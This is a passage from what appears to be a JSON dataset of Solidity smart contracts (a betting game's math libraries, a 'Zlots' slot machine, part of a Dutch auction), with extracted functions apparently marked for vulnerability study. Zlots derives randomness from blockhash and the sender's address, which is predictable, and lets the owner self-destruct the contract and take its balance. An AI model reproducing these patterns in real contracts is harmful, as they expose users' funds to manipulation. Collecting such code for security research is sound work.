expectedGameSize.div(currentPotValue).log10().neg();\n } else {\n return currentPotValue.div(expectedGameSize).log10();\n }\n }\n function getMiningRateAtPoint(FixedPoint.Data point, FixedPoint.Data difficulty, FixedPoint.Data currentPotValue, FixedPoint.Data coins_tbi) private view returns (FixedPoint.Data) {\n assert (point.cmp(currentPotValue) != 1);\n FixedPoint.Data memory expectedGameSize = kExpectedFirstGameSize.mul(difficulty);\n FixedPoint.Data memory depositRatio = point.div(currentPotValue);\n FixedPoint.Data memory brAdj = getBrAdj(currentPotValue, expectedGameSize);\n if(brAdj.cmp(FixedPoint.fromInt256(0)) == -1) {\n return coins_tbi.mul(FixedPoint.fromInt256(1).div(FixedPoint.fromInt256(2).pow(brAdj.neg()))).mul(FixedPoint.fromInt256(2).sub(depositRatio));\n } else {\n return coins_tbi.mul(FixedPoint.fromInt256(2).pow(brAdj)).mul(FixedPoint.fromInt256(2).sub(depositRatio));\n }\n }\n function getExpectedGameSize() external view returns (int256) {\n return kExpectedFirstGameSize.toInt256();\n }\n function totalTokenPayout(FixedPoint.Data currentPotValue, FixedPoint.Data difficulty, FixedPoint.Data unpromisedPopAtStartOfGame, uint256 wagerAmount, uint256 previousPotSize) private view returns (FixedPoint.Data) {\n FixedPoint.Data memory maxPotSize = kExpectedFirstGameSize.mul(difficulty).mul(kMaxPopMiningPotMultiple);\n FixedPoint.Data memory startPoint = FixedPoint.fromInt256(Int256(previousPotSize));\n if(startPoint.cmp(maxPotSize) != -1){\n return FixedPoint.fromInt256(0);\n }\n FixedPoint.Data memory endPoint = FixedPoint.fromInt256(Int256(previousPotSize + wagerAmount));\n if(endPoint.cmp(maxPotSize) != -1){\n endPoint = maxPotSize;\n wagerAmount = maxPotSize.sub(startPoint).toUInt256Raw();\n }\n if(currentPotValue.cmp(maxPotSize) != -1){\n currentPotValue = maxPotSize;\n }\n FixedPoint.Data memory betSizePercent = FixedPoint.fromInt256(Int256(wagerAmount)).div(kExpectedFirstGameSize.mul(difficulty));\n FixedPoint.Data memory expectedCoinsToBeIssuedTwoThirds = FixedPoint.fromFraction(2, 3).mul(unpromisedPopAtStartOfGame.mul(kExpectedPopCoinToBePromisedPercent));\n return getMiningRateAtPoint(startPoint.add(endPoint).div(FixedPoint.fromInt256(2)), difficulty, currentPotValue, expectedCoinsToBeIssuedTwoThirds).mul(betSizePercent);\n }\n function calcNumberOfBlocksUntilGameEnds(FixedPoint.Data currentGameSize, FixedPoint.Data targetGameSize) internal view returns (FixedPoint.Data) {\n return kLowerBoundBlocksTillGameEnd.add(kUpperBoundBlocksTillGameEnd.mul(FixedPoint.fromInt256(1).div(currentGameSize.div(targetGameSize).exp())));\n }\n function calcMinimumBetSize(FixedPoint.Data currentGameSize, FixedPoint.Data targetGameSize) internal view returns (FixedPoint.Data) {\n return currentGameInitialMinBetSize.mul(FixedPoint.fromInt256(2).pow(FixedPoint.fromInt256(1).add(currentGameSize.div(targetGameSize)).log10()));\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary SafeInt {\n function mul(int256 a, int256 b) internal pure returns (int256) {\n if (a == 0) {\n return 0;\n }\n int256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(int256 a, int256 b) internal pure returns (int256) {\n int256 c = a / b;\n return c;\n }\n function sub(int256 a, int256 b) internal pure returns (int256) {\n int256 c = a - b;\n if(a>0 && b<0) {\n assert (c > a);\n } else if(a<0 && b>0) {\n assert (c < a);\n }\n return c;\n }\n function add(int256 a, int256 b) internal pure returns (int256) {\n int256 c = a + b;\n if(a>0 && b>0) {\n assert(c > a);\n } else if (a < 0 && b < 0) {\n assert(c < a);\n }\n return c;\n }\n}\nlibrary WrappedArray {\n using SafeMath for uint256;\n using FixedPoint for FixedPoint.Data;\n struct GameMetaDataElement {\n uint256 totalPotAmount;\n uint256 seedAmount;\n uint256 initialBet;\n uint256 coinsRemaining;\n FixedPoint.Data miningDifficulty;\n bool isActive;\n }\n struct Data {\n GameMetaDataElement[] array;\n }\n function push (Data storage self, GameMetaDataElement element) internal {\n self.array.length = self.array.length.add(1);\n self.array[self.array.length.sub(1)] = element;\n }\n function itemAtIndex (Data storage self, uint256 index) internal view returns(GameMetaDataElement elem) {\n assert(index < self.array.length);\n return self.array[index];\n }\n function length (Data storage self) internal view returns(uint256 len) {\n return self.array.length;\n }\n}\nlibrary CompactArray {\n using SafeMath for uint256;\n struct Element {\n uint256 elem;\n }\n struct Data {\n Element[] array;\n uint256 len;\n uint256 popNextIndex;\n }\n function push (Data storage self, Element element) internal returns(uint256 index) {\n if(self.array.length == self.len) {\n self.array.length = self.array.length.add(1);\n }\n self.array[self.len] = element;\n self.len = self.len.add(1);\n return self.len.sub(1);\n }\n function removeItemAtIndex (Data storage self, uint256 index) internal {\n assert(index < self.len);\n if(index == self.len.sub(1)) {\n self.len = self.len.sub(1);\n return;\n }\n Element storage temp = self.array[self.len.sub(1)];\n self.array[index] = temp;\n self.len = self.len.sub(1);\n }\n function pop (Data storage self) internal returns(Element elem) {\n assert(self.len > 0);\n self.len = self.len.sub(1);\n return self.array[self.len];\n }\n function getNext (Data storage self) internal returns(Element elem) {\n assert(self.len > 0);\n if(self.popNextIndex >= self.len) {\n self.popNextIndex = self.len.sub(1);\n }\n Element memory nextElement = itemAtIndex(self, self.popNextIndex);\n if(self.popNextIndex == 0) {\n self.popNextIndex = self.len.sub(1);\n } else {\n self.popNextIndex = self.popNextIndex.sub(1);\n }\n return nextElement;\n }\n function itemAtIndex (Data storage self, uint256 index) internal view returns(Element elem) {\n assert(index < self.len);\n return self.array[index];\n }\n function length (Data storage self) internal view returns(uint256 len) {\n return self.len;\n }\n}\nlibrary UIntSet {\n using CompactArray for CompactArray.Data;\n struct SetEntry {\n uint256 index;\n bool active;\n }\n struct Data {\n CompactArray.Data compactArray;\n mapping (uint256 => SetEntry) storedValues;\n }\n function contains (Data storage self, uint256 element) internal view returns(bool res) {\n return self.storedValues[element].active;\n }\n function insert (Data storage self, uint256 element) internal {\n if(contains(self, element)) {\n return;\n }\n CompactArray.Element memory newElem = CompactArray.Element(element);\n uint256 index = self.compactArray.push(newElem);\n SetEntry memory entry = SetEntry(index, true);\n self.storedValues[element] = entry;\n }\n function removeElement (Data storage self, uint256 element) internal {\n if(contains(self, element) == false) {\n return;\n }\n uint256 index = self.storedValues[element].index;\n self.compactArray.removeItemAtIndex(index);\n self.storedValues[element].active = false;\n if(index < self.compactArray.length()) {\n CompactArray.Element memory swappedElem = self.compactArray.itemAtIndex(index);\n self.storedValues[swappedElem.elem] = SetEntry(index, true);\n }\n }\n function getNext (Data storage self) internal returns(CompactArray.Element) {\n return self.compactArray.getNext();\n }\n function size (Data storage self) internal view returns(uint256 res) {\n return self.compactArray.length();\n }\n function getItemAtIndex (Data storage self, uint256 index) internal view returns(CompactArray.Element) {\n return self.compactArray.itemAtIndex(index);\n }\n}\nlibrary Player {\n using UIntSet for UIntSet.Data;\n using CompactArray for CompactArray.Data;\n struct BettingRecord {\n address playerAddress;\n uint256 gameId;\n uint256 wagerAmount;\n uint256 bettingRecordId;\n uint256 gamePotBeforeBet;\n uint256 withdrawnAmount;\n uint256 withdrawnPopAmount;\n bool isActive;\n }\n struct Data {\n UIntSet.Data bettingRecordIds;\n mapping (uint256 => BettingRecord) bettingRecordMapping;\n }\n function containsBettingRecordFromId (Data storage self, uint256 bettingRecordId) internal view returns(bool containsBettingRecord) {\n return self.bettingRecordIds.contains(bettingRecordId);\n }\n function getBettingRecordForId (Data storage self, uint256 bettingRecordId) internal view returns(BettingRecord record) {\n if(containsBettingRecordFromId(self, bettingRecordId) == false) {\n return ;\n }\n return self.bettingRecordMapping[bettingRecordId];\n }\n function insertBettingRecord (Data storage self, BettingRecord record) internal {\n self.bettingRecordMapping[record.bettingRecordId] = record;\n self.bettingRecordIds.insert(record.bettingRecordId);\n }\n function getNextRecord (Data storage self) internal returns(BettingRecord record) {\n if(self.bettingRecordIds.size() == 0) {\n return ;\n }\n CompactArray.Element memory bettingRecordIdEntry = self.bettingRecordIds.getNext();\n return self.bettingRecordMapping[bettingRecordIdEntry.elem];\n }\n function getBettingRecordAtIndex (Data storage self, uint256 index) internal view returns(BettingRecord record) {\n return self.bettingRecordMapping[self.bettingRecordIds.getItemAtIndex(index).elem];\n }\n function deleteBettingRecordForId (Data storage self, uint256 bettingRecordId) internal {\n self.bettingRecordIds.removeElement(bettingRecordId);\n }\n function unprocessedBettingRecordCount (Data storage self) internal view returns(uint256 size) {\n return self.bettingRecordIds.size();\n }\n}\nlibrary BettingRecordArray {\n using Player for Player.Data;\n using SafeMath for uint256;\n struct Data {\n Player.BettingRecord[] array;\n uint256 len;\n }\n function resetIndex (Data storage self) internal {\n self.len = 0;\n }\n function pushRecord (Data storage self, Player.BettingRecord record) internal {\n if(self.array.length == self.len) {\n self.array.length = self.array.length.add(1);\n }\n self.array[self.len] = record;\n self.len = self.len.add(1);\n }\n function getNextRecord (Data storage self) internal view returns(Player.BettingRecord record) {\n if(self.array.length == self.len) {\n return;\n }\n return self.array[self.len];\n }\n}\nlibrary FixedPoint {\n using SafeMath for uint256;\n using SafeInt for int256;\n int256 constant fracBits = 32;\n int256 constant scale = 1 << 32;\n int256 constant halfScale = scale >> 1;\n int256 constant precision = 1000000;\n int256 constant e = 11674931554;\n int256 constant pi = 13493037704;\n int256 constant _2pi = 26986075409;\n struct Data {\n int256 val;\n }\n function fromInt256(int256 n) internal pure returns (Data) {\n return Data({val: n.mul(scale)});\n }\n function fromFraction(int256 numerator, int256 denominator) internal pure returns (Data) {\n return Data ({\n val: numerator.mul(scale).div(denominator)\n });\n }\n function toInt256(Data n) internal pure returns (int256) {\n return (n.val * precision) >> fracBits;\n }\n function toUInt256Raw(Data a) internal pure returns (uint256) {\n return uint256(a.val >> fracBits);\n }\n function add(Data a, Data b) internal pure returns (Data) {\n return Data({val: a.val.add(b.val)});\n }\n function sub(Data a, Data b) internal pure returns (Data) {\n return Data({val: a.val.sub(b.val)});\n }\n function mul(Data a, Data b) internal pure returns (Data) {\n int256 result = a.val.mul(b.val).div(scale);\n return Data({val: result});\n }\n function div(Data a, Data b) internal pure returns (Data) {\n int256 num = a.val.mul(scale);\n return Data({val: num.div(b.val)});\n }\n function neg(Data a) internal pure returns (Data) {\n return Data({val: -a.val});\n }\n function mod(Data a, Data b) internal pure returns (Data) {\n return Data({val: a.val % b.val});\n }\n function expBySquaring(Data x, Data n) internal pure returns (Data) {\n if(n.val == 0) {\n return Data({val: scale});\n }\n Data memory extra = Data({val: scale});\n while(true) {\n if(n.val == scale) {\n return mul(x, extra);\n } else if (n.val % (2*scale) != 0) {\n extra = mul(extra, x);\n n = sub(n, fromInt256(1));\n }\n x = mul(x, x);\n n = div(n, fromInt256(2));\n }\n }\n function sin(Data x) internal pure returns (Data) {\n int256 val = x.val % _2pi;\n if(val < -pi) {\n val += _2pi;\n } else if (val > pi) {\n val -= _2pi;\n }\n Data memory result;\n if(val < 0) {\n result = add(mul(Data({val: 5468522184}), Data({val: val})), mul(Data({val: 1740684682}), mul(Data({val: val}), Data({val: val}))));\n if(result.val < 0) {\n result = add(mul(Data({val: 966367641}), sub(mul(result, neg(result)), result)), result);\n } else {\n result = add(mul(Data({val: 966367641}), sub(mul(result, result), result)), result);\n }\n return result;\n } else {\n result = sub(mul(Data({val: 5468522184}), Data({val: val})), mul(Data({val: 1740684682}), mul(Data({val: val}), Data({val: val}))));\n if(result.val < 0) {\n result = add(mul(Data({val: 966367641}), sub(mul(result, neg(result)), result)), result);\n } else {\n result = add(mul(Data({val: 966367641}), sub(mul(result, result), result)), result);\n }\n return result;\n }\n }\n function cmp(Data a, Data b) internal pure returns (int256) {\n if(a.val > b.val) {\n return 1;\n } else if(a.val < b.val) {\n return -1;\n } else {\n return 0;\n }\n }\n function log10(Data a) internal pure returns (Data) {\n return div(ln(a), ln(fromInt256(10)));\n }\n function ln(Data a) internal pure returns (Data) {\n int256 LOG = 0;\n int256 prec = 1000000;\n int256 x = a.val.mul(prec) >> fracBits;\n while(x >= 1500000) {\n LOG = LOG.add(405465);\n x = x.mul(2).div(3);\n }\n x = x.sub(prec);\n int256 y = x;\n int256 i = 1;\n while (i < 10){\n LOG = LOG.add(y.div(i));\n i = i.add(1);\n y = x.mul(y).div(prec);\n LOG = LOG.sub(y.div(i));\n i = i.add(1);\n y = x.mul(y).div(prec);\n }\n LOG = LOG.mul(scale);\n LOG = LOG.div(prec);\n return Data({val: LOG});\n }\n function expRaw(Data a) internal pure returns (Data) {\n int256 l1 = scale.add(a.val.div(4));\n int256 l2 = scale.add(a.val.div(3).mul(l1).div(scale));\n int256 l3 = scale.add(a.val.div(2).mul(l2).div(scale));\n int256 l4 = scale.add(a.val.mul(l3).div(scale));\n return Data({val: l4});\n }\n function exp(Data a) internal pure returns (Data) {\n int256 pwr = a.val >> fracBits;\n int256 frac = a.val.sub(pwr << fracBits);\n return mul(expRaw(Data({val: frac})), expBySquaring(Data({val: e}), fromInt256(pwr)));\n }\n function pow(Data base, Data power) internal pure returns (Data) {\n int256 intpwr = power.val >> 32;\n int256 frac = power.val.sub(intpwr << fracBits);\n return mul(expRaw(mul(Data({val:frac}), ln(base))), expBySquaring(base, fromInt256(intpwr)));\n }\n}",
  "extract_feature": [
    "function bet () payable public {\nrequire(msg.value >= minimumWager);\nrequire(gameHasStarted);\nuint256 betAmount = msg.value;\nbetAmount = betAmountAfterRakeHasBeenWithdrawnAndProcessed(betAmount);\nif((block.number.sub(lastBetBlockNumber) >= minimumNumberOfBlocksToEndGame) && (lastBetBlockNumber != 0)) {\nprocessEndGame(betAmount);\n} else if (lastBetBlockNumber == 0) {\ninitialBankrollGrowthAmount = FixedPoint.fromInt256(Int256(betAmount.add(initialSeed)));\n}\nemit Bet(msg.sender, betAmount, currentBetNumber, currentGameNumber);\nPlayer.BettingRecord memory newBetRecord = Player.BettingRecord(msg.sender, currentGameNumber, betAmount, currentBetNumber, currentPot.sub(initialSeed), 0, 0, true);\nPlayer.Data storage currentPlayer = playerCollection[msg.sender];\ncurrentPlayer.insertBettingRecord(newBetRecord);\nPlayer.BettingRecord memory oldGameUnprocessedBettingRecord = currentGameBettingRecords.getNextRecord();\ncurrentGameBettingRecords.pushRecord(newBetRecord);\nif(oldGameUnprocessedBettingRecord.isActive == true) {\nprocessBettingRecord(oldGameUnprocessedBettingRecord);\n}\ncurrentPot = currentPot.add(betAmount);\ncurrentBetNumber = currentBetNumber.add(1);\nlastBetBlockNumber = block.number;\nFixedPoint.Data memory currentGameSize = FixedPoint.fromInt256(Int256(currentPot));\nFixedPoint.Data memory expectedGameSize = currentMiningDifficulty.mul(kExpectedFirstGameSize);\nminimumNumberOfBlocksToEndGame = calcNumberOfBlocksUntilGameEnds(currentGameSize, expectedGameSize).toUInt256Raw();\nminimumWager = calcMinimumBetSize(currentGameSize, expectedGameSize).toUInt256Raw();\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b3a"
  },
  "filename": "2003.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zlots is ZTHReceivingContract {\n using SafeMath for uint;\n address private owner;\n address private bankroll;\n uint totalSpins;\n uint totalZTHWagered;\n uint contractBalance;\n bool public gameActive;\n address private ZTHTKNADDR;\n address private ZTHBANKROLL;\n ZTHInterface private ZTHTKN;\n mapping (uint => bool) validTokenBet;\n event HouseRetrievedTake(\n uint timeTaken,\n uint tokensWithdrawn\n );\n event TokensWagered(\n address _wagerer,\n uint _wagered\n );\n event LogResult(\n address _wagerer,\n uint _result,\n uint _profit,\n uint _wagered,\n bool _win\n );\n event Loss(\n address _wagerer\n );\n event Jackpot(\n address _wagerer\n );\n event EightXMultiplier(\n address _wagerer\n );\n event ReturnBet(\n address _wagerer\n );\n event TwoAndAHalfXMultiplier(\n address _wagerer\n );\n event OneAndAHalfXMultiplier(\n address _wagerer\n );\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyBankroll {\n require(msg.sender == bankroll);\n _;\n }\n modifier onlyOwnerOrBankroll {\n require(msg.sender == owner || msg.sender == bankroll);\n _;\n }\n modifier gameIsActive {\n require(gameActive == true);\n _;\n }\n constructor(address ZethrAddress, address BankrollAddress) public {\n ZTHTKNADDR = ZethrAddress;\n ZTHBANKROLL = BankrollAddress;\n owner = msg.sender;\n bankroll = ZTHBANKROLL;\n ZTHTKN = ZTHInterface(ZTHTKNADDR);\n ZTHTKN.approve(ZTHBANKROLL, 2**256 - 1);\n ZTHTKN.approve(owner, 2**256 - 1);\n validTokenBet[5e18] = true;\n validTokenBet[10e18] = true;\n validTokenBet[25e18] = true;\n validTokenBet[50e18] = true;\n gameActive = true;\n }\n function() public payable { }\n struct TKN { address sender; uint value; }\n function tokenFallback(address _from, uint _value, bytes ) public returns (bool){\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n _spinTokens(_tkn);\n return true;\n }\n struct playerSpin {\n uint200 tokenValue;\n uint48 blockn;\n }\n mapping(address => playerSpin) public playerSpins;\n function _spinTokens(TKN _tkn) private {\n require(gameActive);\n require(_zthToken(msg.sender));\n require(validTokenBet[_tkn.value]);\n require(jackpotGuard(_tkn.value));\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 48) - 1));\n address _customerAddress = _tkn.sender;\n uint _wagered = _tkn.value;\n playerSpin memory spin = playerSpins[_tkn.sender];\n contractBalance = contractBalance.add(_wagered);\n require(block.number != spin.blockn);\n if (spin.blockn != 0) {\n _finishSpin(_tkn.sender);\n }\n spin.blockn = uint48(block.number);\n spin.tokenValue = uint200(_wagered);\n playerSpins[_tkn.sender] = spin;\n totalSpins += 1;\n totalZTHWagered += _wagered;\n emit TokensWagered(_customerAddress, _wagered);\n }\n function finishSpin() public\n gameIsActive\n returns (uint)\n {\n return _finishSpin(msg.sender);\n }\n function _finishSpin(address target)\n private returns (uint)\n {\n playerSpin memory spin = playerSpins[target];\n require(spin.tokenValue > 0);\n require(spin.blockn != block.number);\n uint profit = 0;\n uint result;\n if (block.number - spin.blockn > 255) {\n result = 9999;\n } else {\n result = random(10000, spin.blockn, target);\n }\n if (result > 4489) {\n emit Loss(target);\n emit LogResult(target, result, profit, spin.tokenValue, false);\n } else {\n if (result < 29) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n emit Jackpot(target);\n } else {\n if (result < 233) {\n profit = SafeMath.mul(spin.tokenValue, 8);\n emit EightXMultiplier(target);\n } else {\n if (result < 641) {\n profit = spin.tokenValue;\n emit ReturnBet(target);\n } else {\n if (result < 1865) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 25), 10);\n emit TwoAndAHalfXMultiplier(target);\n } else {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 15), 10);\n emit OneAndAHalfXMultiplier(target);\n }\n }\n }\n }\n emit LogResult(target, result, profit, spin.tokenValue, true);\n contractBalance = contractBalance.sub(profit);\n ZTHTKN.transfer(target, profit);\n }\n playerSpins[target] = playerSpin(uint200(0), uint48(0));\n return result;\n }\n function jackpotGuard(uint _wager)\n public\n view\n returns (bool)\n {\n uint maxProfit = SafeMath.mul(_wager, 25);\n uint halfContractBalance = SafeMath.div(contractBalance, 2);\n return (maxProfit <= halfContractBalance);\n }\n function maxRandom(uint blockn, address entropy) public view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function balanceOf() public view returns (uint) {\n return contractBalance;\n }\n function addNewBetAmount(uint _tokenAmount)\n public\n onlyOwner\n {\n validTokenBet[_tokenAmount] = true;\n }\n function pauseGame() public onlyOwner {\n gameActive = false;\n }\n function resumeGame() public onlyOwner {\n gameActive = true;\n }\n function changeOwner(address _newOwner) public onlyOwner {\n owner = _newOwner;\n }\n function changeBankroll(address _newBankroll) public onlyOwner {\n bankroll = _newBankroll;\n }\n function divertDividendsToBankroll()\n public\n onlyOwner\n {\n bankroll.transfer(address(this).balance);\n }\n function testingSelfDestruct()\n public\n onlyOwner\n {\n ZTHTKN.transfer(owner, contractBalance);\n selfdestruct(owner);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _spinTokens(TKN _tkn) private {\nrequire(gameActive);\nrequire(_zthToken(msg.sender));\nrequire(validTokenBet[_tkn.value]);\nrequire(jackpotGuard(_tkn.value));\nrequire(_tkn.value < ((2 ** 200) - 1));\nrequire(block.number < ((2 ** 48) - 1));\naddress _customerAddress = _tkn.sender;\nuint _wagered = _tkn.value;\nplayerSpin memory spin = playerSpins[_tkn.sender];\ncontractBalance = contractBalance.add(_wagered);\nrequire(block.number != spin.blockn);\nif (spin.blockn != 0) {\n_finishSpin(_tkn.sender);\n}\nspin.blockn = uint48(block.number);\nspin.tokenValue = uint200(_wagered);\nplayerSpins[_tkn.sender] = spin;\ntotalSpins += 1;\ntotalZTHWagered += _wagered;\nemit TokensWagered(_customerAddress, _wagered);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b3b"
  },
  "filename": "2013.sol",
  "content": "pragma solidity ^0.4.13;\ncontract OracleInterface {\n struct PriceData {\n uint ARTTokenPrice;\n uint blockHeight;\n }\n mapping(uint => PriceData) public historicPricing;\n uint public index;\n address public owner;\n uint8 public decimals;\n function setPrice(uint price) public returns (uint _index) {}\n function getPrice() public view returns (uint price, uint _index, uint blockHeight) {}\n function getHistoricalPrice(uint _index) public view returns (uint price, uint blockHeight) {}\n event Updated(uint indexed price, uint indexed index);\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20Interface is ERC20Basic {\n uint8 public decimals;\n}\ncontract HasNoTokens {\n function tokenFallback(address from_, uint256 value_, bytes data_) external {\n from_;\n value_;\n data_;\n revert();\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract HasNoEther is Ownable {\n constructor() public payable {\n require(msg.value == 0);\n }\n function() external {\n }\n function reclaimEther() external onlyOwner {\n owner.transfer(address(this).balance);\n }\n}\ncontract DutchAuction is Ownable, HasNoEther, HasNoTokens {\n using SafeMath for uint256;\n uint public min_shares_to_sell;\n uint public max_shares_to_sell;\n uint public min_share_price;\n uint public available_shares;\n bool private fundraise_defined;\n uint public fundraise_max;\n state public status = state.pending;\n enum state { pending, active, ended, decrypted, success, failure }\n event Started(uint block_number);\n event BidAdded(uint index);\n event Ended(uint block_number);\n event BidDecrypted(uint index, bool it_will_process);\n event FundraiseDefined(uint min_share_price, uint max);\n event BidBurned(uint index);\n event Decrypted(uint blocknumber, uint bids_decrypted, uint bids_burned);\n event Computed(uint index, uint share_price, uint shares_count);\n event Assigned(uint index, uint shares, uint executed_amout, uint refunded);\n event Refunded(uint index, uint refunded);\n event Success(uint raised, uint share_price, uint delivered_shares);\n event Failure(uint raised, uint share_price);\n event Execution(address destination,uint value,bytes data);\n event ExecutionFailure(address destination,uint value,bytes data);\n uint public final_share_price;\n uint public computed_fundraise;\n uint public final_fundraise;\n uint public computed_shares_sold;\n uint public final_shares_sold;\n uint public winner_bids;\n uint public assigned_bids;\n uint public assigned_shares;\n struct BidData {\n uint origin_index;\n uint bid_id;\n address investor_address;\n uint share_price;\n uint shares_count;\n uint transfer_valuation;\n uint transfer_token;\n uint asigned_shares_count;\n uint executed_amount;\n bool closed;\n }\n uint public bids_sorted_count;\n uint public bids_sorted_refunded;\n mapping (uint => BidData) public bids_sorted;\n uint public bids_burned_count;\n mapping (uint => uint) public bids_burned;\n uint public bids_ignored_count;\n uint public bids_ignored_refunded;\n mapping (uint => BidData) public bids_ignored;\n uint public bids_decrypted_count;\n mapping (uint => uint) public bids_decrypted;\n uint private bids_reset_count;\n struct Bid {\n bytes32 bid_hash;\n uint art_price;\n uint art_price_index;\n bool exist;\n bool is_decrypted;\n bool is_burned;\n bool will_compute;\n }\n uint public bids_count;\n mapping (uint => Bid) public bids;\n uint public bids_computed_cursor;\n uint public shares_holders_count;\n mapping (uint => address) public shares_holders;\n mapping (address => uint) public shares_holders_balance;\n OracleInterface oracle;\n uint public oracle_price_decimals_factor;\n ERC20Interface art_token_contract;\n uint public decimal_precission_difference_factor;\n constructor(\n uint _min_shares_to_sell,\n uint _max_shares_to_sell,\n uint _available_shares,\n address _oracle,\n address _art_token_contract\n ) public {\n require(_max_shares_to_sell > 0);\n require(_max_shares_to_sell >= _min_shares_to_sell);\n require(_available_shares >= _max_shares_to_sell);\n require(_oracle != address(0x0));\n owner = msg.sender;\n min_shares_to_sell = _min_shares_to_sell;\n max_shares_to_sell = _max_shares_to_sell;\n available_shares = _available_shares;\n oracle = OracleInterface(_oracle);\n uint256 oracle_decimals = uint256(oracle.decimals());\n oracle_price_decimals_factor = 10**oracle_decimals;\n art_token_contract = ERC20Interface(_art_token_contract);\n uint256 art_token_decimals = uint256(art_token_contract.decimals());\n decimal_precission_difference_factor = 10**(art_token_decimals.sub(oracle_decimals));\n }\n function setFundraiseLimits(uint _min_share_price, uint _fundraise_max) public onlyOwner{\n require(!fundraise_defined);\n require(_min_share_price > 0);\n require(_fundraise_max > 0);\n require(status == state.ended);\n fundraise_max = _fundraise_max;\n min_share_price = _min_share_price;\n emit FundraiseDefined(min_share_price,fundraise_max);\n fundraise_defined = true;\n }\n function startAuction() public onlyOwner{\n require(status == state.pending);\n status = state.active;\n emit Started(block.number);\n }\n function endAuction() public onlyOwner{\n require(status == state.active);\n status = state.ended;\n emit Ended(block.number);\n }\n function appendEncryptedBid(bytes32 _bid_hash, uint price_index) public onlyOwner returns (uint index){\n require(status == state.active);\n uint art_price;\n uint art_price_blockHeight;\n (art_price, art_price_blockHeight) = oracle.getHistoricalPrice(price_index);\n bids[bids_count] = Bid(_bid_hash, art_price, price_index, true, false, false, false);\n index = bids_count;\n emit BidAdded(bids_count++);\n }\n function getBidHash(uint nonce, uint bid_id, address investor_address, uint share_price, uint shares_count) public pure returns(bytes32) {\n return keccak256(abi.encodePacked(nonce, bid_id, investor_address, share_price, shares_count));\n }\n function burnBid(uint _index) public onlyOwner {\n require(status == state.ended);\n require(bids_sorted_count == 0);\n require(bids[_index].exist == true);\n require(bids[_index].is_decrypted == false);\n require(bids[_index].is_burned == false);\n bids_burned[bids_burned_count] = _index;\n bids_burned_count++;\n bids_decrypted[bids_decrypted_count] = _index;\n bids_decrypted_count++;\n bids[_index].is_burned = true;\n emit BidBurned(_index);\n }\n function appendDecryptedBid(uint _nonce, uint _index, uint _bid_id, address _investor_address, uint _share_price, uint _shares_count, uint _transfered_token) onlyOwner public {\n require(status == state.ended);\n require(fundraise_defined);\n require(bids[_index].exist == true);\n require(bids[_index].is_decrypted == false);\n require(bids[_index].is_burned == false);\n require(_share_price > 0);\n require(_shares_count > 0);\n require(_transfered_token >= convert_valuation_to_art(_shares_count.mul(_share_price),bids[_index].art_price));\n if (bids_sorted_count > 0){\n BidData memory previous_bid_data = bids_sorted[bids_sorted_count-1];\n require(_share_price <= previous_bid_data.share_price);\n if (_share_price == previous_bid_data.share_price){\n require(_index > previous_bid_data.origin_index);\n }\n }\n require(\n getBidHash(_nonce, _bid_id,_investor_address,_share_price,_shares_count) == bids[_index].bid_hash\n );\n uint _transfer_amount = _share_price.mul(_shares_count);\n BidData memory bid_data = BidData(_index, _bid_id, _investor_address, _share_price, _shares_count, _transfer_amount, _transfered_token, 0, 0, false);\n bids[_index].is_decrypted = true;\n if (_share_price >= min_share_price){\n bids[_index].will_compute = true;\n bids_sorted[bids_sorted_count] = bid_data;\n bids_sorted_count++;\n emit BidDecrypted(_index,true);\n }else{\n bids[_index].will_compute = false;\n bids_ignored[bids_ignored_count] = bid_data;\n bids_ignored_count++;\n emit BidDecrypted(_index,false);\n }\n 